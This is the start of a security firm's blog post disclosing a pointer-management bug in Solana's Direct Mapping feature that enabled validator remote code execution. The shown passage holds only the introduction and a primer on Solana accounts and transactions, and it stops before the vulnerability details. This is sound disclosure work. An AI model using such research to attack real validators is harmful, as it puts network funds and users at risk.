<!DOCTYPE html><html lang="en"><head><meta charSet="utf-8"/><meta name="viewport" content="width=device-width, initial-scale=1"/><link rel="preload" href="/_next/static/media/8360eb76cbf3c3fd-s.p.woff2" as="font" crossorigin="" type="font/woff2"/><link rel="preload" href="/_next/static/media/981f1daddbf10233-s.p.woff2" as="font" crossorigin="" type="font/woff2"/><link rel="preload" as="image" href="/logo.png"/><link rel="preload" as="image" href="/blog/2025_06_27/single_program_memory_layout.png"/><link rel="preload" as="image" href="/blog/2025_06_27/cpi_call.png"/><link rel="preload" as="image" href="/blog/2025_06_27/cpi_return.png"/><link rel="preload" as="image" href="/blog/2025_06_27/legacy_memoryregion.png"/><link rel="preload" as="image" href="/blog/2025_06_27/new_memoryregion.png"/><link rel="preload" as="image" href="/blog/2025_06_27/copy_on_write.png"/><link rel="preload" as="image" href="/blog/2025_06_27/new_cpi_call.png"/><link rel="preload" as="image" href="/blog/2025_06_27/new_cpi_return.png"/><link rel="preload" as="image" href="/blog/2025_06_27/memoryregion_update.png"/><link rel="stylesheet" href="/_next/static/css/56704f9b52fbed47.css" data-precedence="next"/><link rel="preload" as="script" fetchPriority="low" href="/_next/static/chunks/webpack-614d967e4679fa1b.js"/><script src="/_next/static/chunks/4bd1b696-1962bfe149af46cd.js" async=""></script><script src="/_next/static/chunks/684-4fbf2e75f478ddad.js" async=""></script><script src="/_next/static/chunks/main-app-e4e8c22b6afb7972.js" async=""></script><script src="/_next/static/chunks/261-863ea0bd4c945dc7.js" async=""></script><script src="/_next/static/chunks/app/blog/%5Bslug%5D/page-2436fd1eab0440fc.js" async=""></script><meta name="next-size-adjust" content=""/><title>Anatomist Security – Web3 / Blockchain Audit Experts</title><meta name="description" content="Seasoned security researchers providing deep‑dive smart‑contract &amp; blockchain infrastructure audits, fuzzing and consulting."/><meta name="keywords" content="smart contract audit,blockchain security,web3,eth,solidity,vyper,solana,audit,pentest"/><link rel="canonical" href="https://anatomi.st/blog/2025_06_27_pwning_solana_for_fun_and_profit"/><meta property="og:title" content="Anatomist Security – Web3 Audit Experts"/><meta property="og:description" content="Battle‑tested researchers securing billions in on‑chain value."/><meta property="og:url" content="https://anatomi.st"/><meta property="og:site_name" content="Anatomist Security"/><meta property="og:locale" content="en_US"/><meta property="og:image" content="https://anatomi.st/og-cover.png"/><meta property="og:type" content="website"/><meta name="twitter:card" content="summary_large_image"/><meta name="twitter:site" content="@th3anatomist"/><meta name="twitter:creator" content="@th3anatomist"/><meta name="twitter:title" content="Anatomist Security – Web3 Audit Experts"/><meta name="twitter:description" content="Battle‑tested researchers securing billions in on‑chain value."/><meta name="twitter:image" content="https://anatomi.st/og-cover.png"/><link rel="icon" href="/favicon.ico" type="image/x-icon" sizes="32x32"/><link rel="icon" href="/favicon.ico"/><script>document.querySelectorAll('body link[rel="icon"], body link[rel="apple-touch-icon"]').forEach(el => document.head.appendChild(el))</script><script src="/_next/static/chunks/polyfills-42372ed130431b0a.js" noModule=""></script></head><body class="__variable_0f85a8 antialiased"><header class="fixed inset-x-0 top-0 z-30 transition-all duration-300 ease-in-out bg-transparent translate-y-0"><nav class="mx-auto flex max-w-6xl items-center justify-between px-4 py-4 lg:px-8"><a href="/#" aria-label="Anatomist home" class="flex items-center cursor-pointer"><img alt="Anatomist Security" width="140" height="32" decoding="async" data-nimg="1" class="h-8 w-auto object-contain" style="color:transparent" src="/logo.png"/></a><div class="hidden items-center gap-6 lg:flex"><a href="#about" class="text-sm font-medium text-white hover:text-accent1 cursor-pointer">About</a><a href="#services" class="text-sm font-medium text-white hover:text-accent1 cursor-pointer">Services</a><a href="/blog" class="text-sm font-medium text-white hover:text-accent1 cursor-pointer">Blog</a><a href="#contact" class="relative inline-flex items-center gap-2 rounded-full bg-gradient-to-r from-accent2 to-accent3 p-[2px] transition-transform hover:scale-105 cursor-pointer"><span class="flex items-center rounded-full bg-black/90 px-5 py-2 text-sm font-semibold text-white">Contact<svg class="ml-2 h-4 w-4 transition-transform group-hover:translate-x-1" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M17 8l4 4m0 0l-4 4m4-4H3"></path></svg></span><span class="absolute inset-0 -z-10 animate-pulse rounded-full bg-gradient-to-r from-accent2 to-accent3 opacity-30"></span></a></div><button aria-label="toggle menu" class="cursor-pointer text-2xl text-white lg:hidden">☰</button></nav><aside class="fixed top-0 z-10 h-screen w-64 max-w-64 bg-black/90 backdrop-blur-md transition-[right] duration-300 ease-in-out lg:hidden -right-64"><div class="flex h-full flex-col items-start p-8"><button aria-label="close menu" class="mb-8 cursor-pointer self-end text-3xl text-white hover:text-accent1">×</button><ul class="inline-flex flex-col gap-4"><a href="#about" class="block rounded-md px-2 py-3 text-lg font-medium text-white hover:text-accent1 cursor-pointer">About</a><a href="#services" class="block rounded-md px-2 py-3 text-lg font-medium text-white hover:text-accent1 cursor-pointer">Services</a><a href="/blog" class="block rounded-md px-2 py-3 text-lg font-medium text-white hover:text-accent1 cursor-pointer">Blog</a><a href="#contact" class="relative mt-4 inline-flex cursor-pointer items-center gap-2 rounded-full bg-gradient-to-r from-accent2 to-accent3 p-[2px] transition-transform hover:scale-105"><span class="flex items-center rounded-full bg-black/90 px-5 py-2 text-sm font-semibold text-white">Contact<svg class="ml-2 h-4 w-4 transition-transform group-hover:translate-x-1" fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path stroke-linecap="round" stroke-linejoin="round" d="M17 8l4 4m0 0l-4 4m4-4H3"></path></svg></span><span class="absolute inset-0 -z-10 animate-pulse rounded-full bg-gradient-to-r from-accent2 to-accent3 opacity-30"></span></a></ul></div></aside></header><main class="relative isolate bg-black px-6 py-24 pt-32 sm:py-32 lg:px-8 min-h-screen"><div class="absolute inset-x-0 -top-40 -z-10 transform-gpu overflow-hidden blur-3xl sm:-top-80" aria-hidden="true"><div class="relative left-[calc(50%-11rem)] aspect-[1155/678] w-[36.125rem] -translate-x-1/2 rotate-[30deg] bg-gradient-to-tr from-accent2 to-accent3 opacity-30 sm:left-[calc(50%-30rem)] sm:w-[72.1875rem]" style="clip-path:polygon(74.1% 44.1%, 100% 61.6%, 97.5% 26.9%, 85.5% 0.1%, 80.7% 2%, 72.5% 32.5%, 60.2% 62.4%, 52.4% 68.1%, 47.5% 58.3%, 45.2% 34.5%, 27.5% 76.7%, 0.1% 64.9%, 17.9% 100%, 27.6% 76.8%, 76.1% 97.7%, 74.1% 44.1%)"></div></div><div class="mx-auto max-w-4xl"><article class="prose prose-invert prose-lg lg:prose-xl prose-headings:font-urbanist prose-headings:bg-gradient-to-r prose-headings:from-accent1 prose-headings:via-primary prose-headings:to-secondary prose-headings:bg-clip-text prose-headings:text-transparent prose-a:text-accent1 hover:prose-a:text-accent2 prose-strong:text-white"><div class="mb-8 border-b border-white/10 pb-6"><a class="text-accent1 hover:text-accent2 text-sm mb-4 inline-block" href="/blog">← Back to Blog</a><h1 class="text-4xl font-extrabold tracking-tight text-white sm:text-5xl font-urbanist">Pwning Solana for Fun and Profit - Exploiting a Subtle Rust Bug for Validator RCE and Money-Printing</h1><div class="mt-4 flex items-center gap-x-4 text-sm"><time dateTime="2025-06-27T00:00:00.000Z" class="text-gray-400">June 27, 2025</time><span class="text-gray-500">by <!-- -->anatomist</span></div></div><style>
                mjx-container[jax="SVG"] > svg {
                  display: inline !important;
                }
              </style><h2 class="text-4xl py-4 border-b border-white/10">The Road to RCE</h2>
<p class="text-xl py-3 text-pretty sm:text-justify">In this blog, we examine the Direct Mapping optimization first introduced in Solana version 1.16. Our research revealed a critical vulnerability caused by an oversight in pointer management, ultimately allowing us to achieve <strong>full remote code execution (RCE) on a validator node</strong>. This feature was never enabled on mainnet, but had this flaw gone unpatched, it could have compromised the entire Solana network—putting what is today <strong>over $9 billion in total value locked (TVL)</strong> at risk.</p>
<p class="text-xl py-3 text-pretty sm:text-justify">In addition to diving into vulnerability details, we want to also <strong>demystify the bug-hunting process</strong> in this blog. As fascinating as it is to read about all the astonishing findings published by security researchers, rarely do we get a glimpse at the thought process behind. The path to discovering a critical bug is often marked by dead ends, intuition, curiosity, and deep system internals knowledge. By walking through our initial observations and narrowing down the actual vulnerability, we hope to shed light on what real-world vulnerability research looks like.</p>
<p class="text-xl py-3 text-pretty sm:text-justify">Before we start, if you&#x27;re primarily interested in the technical discussions, skip ahead to the <a class="text-accent1 hover:text-indigo-300 underline decoration-1 underline-offset-4" target="_blank" rel="noopener noreferrer" href="#Setting-the-Stage-A-Primer-on-Solanas-Execution-Environment">Setting the Stage: A Primer on Solana&#x27;s Execution Environment</a> section, where we discuss the background knowledge required to understand the bug. If you know your way around Solana internals and just want to read about the bug, you can jump directly to <a class="text-accent1 hover:text-indigo-300 underline decoration-1 underline-offset-4" target="_blank" rel="noopener noreferrer" href="#The-Vulnerability">The Vulnerability</a> section. Otherwise, sit back and join us as we revisit this rollercoaster of a journey. :)</p>
<h2 class="text-4xl py-4 border-b border-white/10">Very Long Story, Hopefully Short Enough</h2>
<p class="text-xl py-3 text-pretty sm:text-justify">Many blockchains have embraced modern programming languages like Rust and Go, which are often seen as safer alternatives to lower-level options like C or C++. While language choice is sometimes a matter of taste, it significantly shapes a protocol’s security profile. Solana uses Rust, a language renowned for memory safety and object lifetime management.</p>
<p class="text-xl py-3 text-pretty sm:text-justify">But of course, no software is impenetrable. Even before we discovered the RCE vulnerability, our dissection of Solana had already uncovered several validator mismatch bugs that could compromise the chain&#x27;s liveness. These ranged from non-deterministic execution across multiple validators to misconfigurations in feature gating that led to unsynchronized upgrades. All of which indicate that <strong>Solana isn’t bulletproof</strong>.</p>
<p class="text-xl py-3 text-pretty sm:text-justify">Most of the bugs we previously found leans more to the business logic side. After getting several of these, we are no longer satisfied with unveiling just another business logic bug. We want something deeper, something buried deep in Solana&#x27;s system internals—<strong>the kind you uncover only through the most meticulous anatomy</strong>.</p>
<p class="text-xl py-3 text-pretty sm:text-justify">One target we set sight on is the removal of memory address translation, which seems like a powerful, but extremely dangerous optimization. Unfortunately, this feature never materialized.</p>
<p class="text-xl py-3 text-pretty sm:text-justify">While we&#x27;re keeping watch of the address translation feature, we started exploring adjacent parts of the codebase. It wasn&#x27;t long before we stumbled upon another interesting feature called Direct Mapping. And it was in this feature we discovered the kind of vulnerability we&#x27;re looking for, one with the potential to <strong>compromise the entire blockchain</strong>.</p>
<p class="text-xl py-3 text-pretty sm:text-justify">As you might already know, <strong>every performance optimization carries the risk of introducing vulnerabilities</strong>. The intuitive way to manage VM memory is to isolate it completely from the host running it. This ensures safety but sometimes introduces performance hits. Attempting to eliminate this isolation for speed, while still maintaining security, is ambitious and inherently <strong>risky</strong>.</p>
<p class="text-xl py-3 text-pretty sm:text-justify">Solana began developing the optimization starting with Direct Mapping, especially during Cross-Program Invocations (CPI), when programs must serialize and copy large amounts of account data, resulting in significant execution overhead. The new Direct Mapping mechanism introduced in Solana v1.16 aimed to eliminate unnecessary copying. Account data buffers are directly mapped into VM memory with the pointers dynamically updated rather than copying the entire data. However, this optimization required strict runtime validation of pointers during these dynamic updates, which was inadequately implemented and ultimately introduced the vulnerability.</p>
<p class="text-xl py-3 text-pretty sm:text-justify">The vulnerability was powerful, but unfortunately, our exploit hit an unexpected wall thanks to an unrelated patch. After some hard work navigating the new limitations, we ultimately managed to craft a working exploit. Now, if you&#x27;re ready, let&#x27;s dive into the technical details.</p>
<h2 class="text-4xl py-4 border-b border-white/10">Setting the Stage: A Primer on Solana&#x27;s Execution Environment</h2>
<p class="text-xl py-3 text-pretty sm:text-justify">To analyze the security of a system, we first need to understand how it works. Solana is heavily optimized for performance, more specifically, parallel execution of transactions, and requires extra care to prevent race conditions or non-determinism issues that may lead to liveness failures. This results in an object oriented design that incorporating Solana&#x27;s unique data storage and transaction models.</p>
<h3 class="text-3xl py-4 border-b border-white/10">The Solana Account Model</h3>
<p class="text-xl py-3 text-pretty sm:text-justify">In Solana, everything is stored in what are called <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">Accounts</code>. You can think of the entire state of the Solana blockchain as a giant key-value store, where the &quot;key&quot; is an <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">Address</code> (a <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">Pubkey</code>) and the &quot;value&quot; is the account data itself.</p>
<p class="text-xl py-3 text-pretty sm:text-justify">An <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">Account</code> holds several information, most importantly, it tracks the amount of native tokens an account has (<code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">lamports</code>), the <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">owner</code> of the account, and an opaque <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">data</code> field.</p>
<pre><div class="rounded-sm" style="color:#ccc;background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto"><code class="language-rust" style="white-space:pre;color:#ccc;background:none;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999">1</span><span class="token token" style="color:#cc99cd">pub</span><span> </span><span class="token token" style="color:#cc99cd">struct</span><span> </span><span class="token token type-definition" style="color:#f8c555">Account</span><span> </span><span class="token token" style="color:#ccc">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999">2</span><span>    </span><span class="token token" style="color:#cc99cd">pub</span><span> lamports</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#cc99cd">u64</span><span class="token token" style="color:#ccc">,</span><span>        </span><span class="token token" style="color:#999">// Native token balance</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999">3</span><span>    </span><span class="token token" style="color:#cc99cd">pub</span><span> data</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#f8c555">Vec</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token" style="color:#cc99cd">u8</span><span class="token token" style="color:#67cdcc">&gt;</span><span class="token token" style="color:#ccc">,</span><span>        </span><span class="token token" style="color:#999">// Variable-length state data</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999">4</span><span>    </span><span class="token token" style="color:#cc99cd">pub</span><span> owner</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#f8c555">Pubkey</span><span class="token token" style="color:#ccc">,</span><span>        </span><span class="token token" style="color:#999">// Program authorized to modify this account</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999">5</span><span>    </span><span class="token token" style="color:#cc99cd">pub</span><span> executable</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#cc99cd">bool</span><span class="token token" style="color:#ccc">,</span><span>     </span><span class="token token" style="color:#999">// Whether this account contains executable code</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999">6</span><span>    </span><span class="token token" style="color:#cc99cd">pub</span><span> rent_epoch</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#f8c555">Epoch</span><span class="token token" style="color:#ccc">,</span><span>    </span><span class="token token" style="color:#999">// Rent tracking information</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:2.25em;padding-right:1em;text-align:right;user-select:none;color:#999">7</span><span></span><span class="token token" style="color:#ccc">}</span></code></div></pre>
<p class="text-xl py-3 text-pretty sm:text-justify">The <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">data</code> field is where the magic happens. For a simple wallet account, this might be empty. But for an account owned by a program, this byte array holds all of its state. The structure of this data is defined by each program. This <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">data</code> field is the central component of our story.</p>
<h3 class="text-3xl py-4 border-b border-white/10">Transaction and Instruction Flow</h3>
<p class="text-xl py-3 text-pretty sm:text-justify">To take full advantage of storing data as <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">Account</code>, Solana <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">Transaction</code> specify upfront which accounts it intends to access, as well as how it intends to access the accounts (read only or read + write). This allows validators to check if different transactions has overlapping storage access, and decide on whether it is safe to schedule transactions for execution in parallel.</p>
<p class="text-xl py-3 text-pretty sm:text-justify"><code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">Transaction</code> can also include multiple <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">Instruction</code>, each of which is a contract call. This provides a scripting capability for users to perform complex operations in a single transaction. The <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">Instructions</code> in a <code class="break-all rounded-sm px-1 py-0.4 border border-gray-600" style="background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:18px">Transaction</code> are executed sequentially and atomically.</p>
<pre><div class="rounded-sm" style="color:#ccc;background:#2d2d2d;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;white-space:pre;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none;padding:1em;margin:.5em 0;overflow:auto"><code class="language-rust" style="white-space:pre;color:#ccc;background:none;font-family:Consolas, Monaco, &#x27;Andale Mono&#x27;, &#x27;Ubuntu Mono&#x27;, monospace;font-size:1em;text-align:left;word-spacing:normal;word-break:normal;word-wrap:normal;line-height:1.5;-moz-tab-size:4;-o-tab-size:4;tab-size:4;-webkit-hyphens:none;-moz-hyphens:none;-ms-hyphens:none;hyphens:none"><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">1</span><span class="token token" style="color:#cc99cd">pub</span><span> </span><span class="token token" style="color:#cc99cd">struct</span><span> </span><span class="token token type-definition" style="color:#f8c555">Transaction</span><span> </span><span class="token token" style="color:#ccc">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">2</span><span>    </span><span class="token token" style="color:#cc99cd">pub</span><span> signatures</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#f8c555">Vec</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token" style="color:#f8c555">Signature</span><span class="token token" style="color:#67cdcc">&gt;</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">3</span><span>    </span><span class="token token" style="color:#cc99cd">pub</span><span> message</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#f8c555">Message</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">4</span><span></span><span class="token token" style="color:#ccc">}</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">5</span>
<span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">6</span><span></span><span class="token token" style="color:#cc99cd">pub</span><span> </span><span class="token token" style="color:#cc99cd">struct</span><span> </span><span class="token token type-definition" style="color:#f8c555">Message</span><span> </span><span class="token token" style="color:#ccc">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">7</span><span>    </span><span class="token token" style="color:#cc99cd">pub</span><span> header</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#f8c555">MessageHeader</span><span class="token token" style="color:#ccc">,</span><span>                    </span><span class="token token" style="color:#999">// Access type (read / write) of each accessed account</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">8</span><span>    </span><span class="token token" style="color:#cc99cd">pub</span><span> account_keys</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#f8c555">Vec</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token" style="color:#f8c555">Pubkey</span><span class="token token" style="color:#67cdcc">&gt;</span><span class="token token" style="color:#ccc">,</span><span>                </span><span class="token token" style="color:#999">// Accounts accessed by the transaction</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">9</span><span>    </span><span class="token token" style="color:#cc99cd">pub</span><span> instructions</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#f8c555">Vec</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token" style="color:#f8c555">CompiledInstruction</span><span class="token token" style="color:#67cdcc">&gt;</span><span class="token token" style="color:#ccc">,</span><span>   </span><span class="token token" style="color:#999">// Actions performed by the transaction</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">10</span><span>    </span><span class="token token" style="color:#ccc">...</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">11</span><span></span><span class="token token" style="color:#ccc">}</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">12</span>
<span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">13</span><span></span><span class="token token" style="color:#cc99cd">pub</span><span> </span><span class="token token" style="color:#cc99cd">struct</span><span> </span><span class="token token type-definition" style="color:#f8c555">MessageHeader</span><span> </span><span class="token token" style="color:#ccc">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">14</span><span>    </span><span class="token token" style="color:#cc99cd">pub</span><span> num_required_signatures</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#cc99cd">u8</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">15</span><span>    </span><span class="token token" style="color:#cc99cd">pub</span><span> num_readonly_signed_accounts</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#cc99cd">u8</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">16</span><span>    </span><span class="token token" style="color:#cc99cd">pub</span><span> num_readonly_unsigned_accounts</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#cc99cd">u8</span><span class="token token" style="color:#ccc">,</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">17</span><span></span><span class="token token" style="color:#ccc">}</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">18</span>
<span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">19</span><span></span><span class="token token" style="color:#cc99cd">pub</span><span> </span><span class="token token" style="color:#cc99cd">struct</span><span> </span><span class="token token type-definition" style="color:#f8c555">Instruction</span><span> </span><span class="token token" style="color:#ccc">{</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">20</span><span>    </span><span class="token token" style="color:#cc99cd">pub</span><span> program_id</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#f8c555">Pubkey</span><span class="token token" style="color:#ccc">,</span><span>              </span><span class="token token" style="color:#999">// Program to execute</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">21</span><span>    </span><span class="token token" style="color:#cc99cd">pub</span><span> accounts</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#f8c555">Vec</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token" style="color:#f8c555">AccountMeta</span><span class="token token" style="color:#67cdcc">&gt;</span><span class="token token" style="color:#ccc">,</span><span>      </span><span class="token token" style="color:#999">// Accounts this instruction will access</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">22</span><span>    </span><span class="token token" style="color:#cc99cd">pub</span><span> data</span><span class="token token" style="color:#ccc">:</span><span> </span><span class="token token" style="color:#f8c555">Vec</span><span class="token token" style="color:#67cdcc">&lt;</span><span class="token token" style="color:#cc99cd">u8</span><span class="token token" style="color:#67cdcc">&gt;</span><span class="token token" style="color:#ccc">,</span><span>                   </span><span class="token token" style="color:#999">// Instruction-specific data</span><span>
</span><span class="linenumber react-syntax-highlighter-line-number" style="display:inline-block;min-width:3.25em;padding-right:1em;text-align:right;user-select:none;color:#999">23</span><span></span><span class="token token" style="color:#ccc">}</span></code></div></pre>
<h3 class="text-3xl py-4 border-b border-white/10">The rBPF Virtual Machine</h3>
<p class="text-xl py-3 text-pretty sm:text-justify">Solana programs are typically written in Rust and compiled to a variant of eBPF (extended Berkeley Packet Filter) bytecode. The validator executes this bytecode within a sandboxed virtual machine.</p>
<p class="text-xl py-3 text-pretty sm:text-justify">For each transaction, the validator allocates a dedicated, isolated memory space for the VM. The virtual address memory map used by Solana SBF programs is fixed and laid out as follows:</p>
